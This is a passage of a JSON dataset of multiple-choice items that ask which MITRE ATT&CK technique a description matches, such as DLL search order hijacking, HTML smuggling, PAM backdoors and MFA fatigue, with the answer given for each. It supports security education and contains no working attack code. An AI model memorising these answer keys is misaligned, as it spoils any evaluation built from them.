      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
      "options": "A. Hijack Execution Flow: DLL Search Order Hijacking, B. Unsecured Credentials: Cloud Instance Metadata API, C. Event Triggered Execution: Screensaver, D. Hide Artifacts: Resource Forking",
      "choice": "A. Hijack Execution Flow: DLL Search Order Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.\n\nA. Establish Accounts: Cloud Accounts, B. Input Capture: Web Portal Capture, C. Command and Scripting Interpreter: PowerShell, D. Obfuscated Files or Information: HTML Smuggling\nA:",
    "context": "",
    "output": "D. Obfuscated Files or Information: HTML Smuggling",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.",
      "options": "A. Establish Accounts: Cloud Accounts, B. Input Capture: Web Portal Capture, C. Command and Scripting Interpreter: PowerShell, D. Obfuscated Files or Information: HTML Smuggling",
      "choice": "D. Obfuscated Files or Information: HTML Smuggling",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.\nA. Hide Artifacts: Hidden Window, B. Exfiltration Over C2 Channel, C. Modify Authentication Process: Pluggable Authentication Modules, D. Archive Collected Data",
    "context": "",
    "output": "C. Modify Authentication Process: Pluggable Authentication Modules",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",
      "options": "A. Hide Artifacts: Hidden Window, B. Exfiltration Over C2 Channel, C. Modify Authentication Process: Pluggable Authentication Modules, D. Archive Collected Data",
      "choice": "C. Modify Authentication Process: Pluggable Authentication Modules",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.  \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.\n\nA. Obfuscated Files or Information, B. Modify Authentication Process: Multi-Factor Authentication, C. Active Scanning: Scanning IP Blocks, D. Boot or Logon Initialization Scripts\nA:",
    "context": "",
    "output": "B. Modify Authentication Process: Multi-Factor Authentication",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.  \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.",
      "options": "A. Obfuscated Files or Information, B. Modify Authentication Process: Multi-Factor Authentication, C. Active Scanning: Scanning IP Blocks, D. Boot or Logon Initialization Scripts",
      "choice": "B. Modify Authentication Process: Multi-Factor Authentication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).\nA. Credentials from Password Stores: Password Managers, B. Hide Artifacts, C. Gather Victim Host Information: Software, D. Gather Victim Network Information: Network Trust Dependencies",
    "context": "",
    "output": "C. Gather Victim Host Information: Software",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).",
      "options": "A. Credentials from Password Stores: Password Managers, B. Hide Artifacts, C. Gather Victim Host Information: Software, D. Gather Victim Network Information: Network Trust Dependencies",
      "choice": "C. Gather Victim Host Information: Software",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \u201cMFA fatigue.\u201d\nA. Multi-Stage Channels, B. Subvert Trust Controls: Install Root Certificate, C. Multi-Factor Authentication Request Generation, D. Process Injection: Thread Execution Hijacking\nAnswer:",
    "context": "",
    "output": "C. Multi-Factor Authentication Request Generation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \u201cMFA fatigue.\u201d",
      "options": "A. Multi-Stage Channels, B. Subvert Trust Controls: Install Root Certificate, C. Multi-Factor Authentication Request Generation, D. Process Injection: Thread Execution Hijacking",
      "choice": "C. Multi-Factor Authentication Request Generation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).\n\nOptions:\nA. System Network Connections Discovery, B. Modify Registry, C. Exploitation for Defense Evasion, D. Boot or Logon Autostart Execution: Time Providers",
    "context": "",
    "output": "A. System Network Connections Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
      "options": "A. System Network Connections Discovery, B. Modify Registry, C. Exploitation for Defense Evasion, D. Boot or Logon Autostart Execution: Time Providers",
      "choice": "A. System Network Connections Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.\n\nC2 networks may include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.\n\nAdversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents. Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., Virtualization/Sandbox Evasion).\n\nHiding C2 infrastructure may also be supported by Resource Development activities such as Acquire Infrastructure and Compromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.\nA. Input Capture: Credential API Hooking, B. Credentials from Password Stores: Password Managers, C. Data Staged: Local Data Staging, D. Hide Infrastructure",
    "context": "",
    "output": "D. Hide Infrastructure",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.\n\nC2 networks may include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.\n\nAdversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents. Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., Virtualization/Sandbox Evasion).\n\nHiding C2 infrastructure may also be supported by Resource Development activities such as Acquire Infrastructure and Compromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.",
      "options": "A. Input Capture: Credential API Hooking, B. Credentials from Password Stores: Password Managers, C. Data Staged: Local Data Staging, D. Hide Infrastructure",
      "choice": "D. Hide Infrastructure",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user. \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.\n\nA. Audio Capture, B. Dynamic Resolution, C. Domain or Tenant Policy Modification: Trust Modification, D. Obtain Capabilities: Exploits\nA:",
    "context": "",
    "output": "C. Domain or Tenant Policy Modification: Trust Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user. \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.",
      "options": "A. Audio Capture, B. Dynamic Resolution, C. Domain or Tenant Policy Modification: Trust Modification, D. Obtain Capabilities: Exploits",
      "choice": "C. Domain or Tenant Policy Modification: Trust Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.\n\nOptions:\nA. Server Software Component: Transport Agent, B. Develop Capabilities: Malware, C. Hijack Execution Flow: KernelCallbackTable, D. Exfiltration Over Web Service",
    "context": "",
    "output": "A. Server Software Component: Transport Agent",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
      "options": "A. Server Software Component: Transport Agent, B. Develop Capabilities: Malware, C. Hijack Execution Flow: KernelCallbackTable, D. Exfiltration Over Web Service",
      "choice": "A. Server Software Component: Transport Agent",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts. \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.\n\n**Note:** this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.\n\nA. Modify Authentication Process: Domain Controller Authentication, B. System Binary Proxy Execution: Mshta, C. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, D. Hide Artifacts: Run Virtual Instance\nAnswer:",
    "context": "",
    "output": "C. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts. \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.\n\n**Note:** this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.",
      "options": "A. Modify Authentication Process: Domain Controller Authentication, B. System Binary Proxy Execution: Mshta, C. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, D. Hide Artifacts: Run Virtual Instance",
      "choice": "C. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.\n\nPossible answers:\nA. Account Discovery: Domain Account, B. Gather Victim Org Information, C. Input Capture: Web Portal Capture, D. Indicator Removal: Clear Persistence",
    "context": "",
    "output": "C. Input Capture: Web Portal Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.",
      "options": "A. Account Discovery: Domain Account, B. Gather Victim Org Information, C. Input Capture: Web Portal Capture, D. Indicator Removal: Clear Persistence",
      "choice": "C. Input Capture: Web Portal Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).\n\nIn some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.\n\nOptions:\nA. User Execution: Malicious Link, B. Server Software Component: Transport Agent, C. Brute Force: Password Cracking, D. Indicator Removal: Clear Persistence",
    "context": "",
    "output": "D. Indicator Removal: Clear Persistence",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).\n\nIn some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.",
      "options": "A. User Execution: Malicious Link, B. Server Software Component: Transport Agent, C. Brute Force: Password Cracking, D. Indicator Removal: Clear Persistence",
      "choice": "D. Indicator Removal: Clear Persistence",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
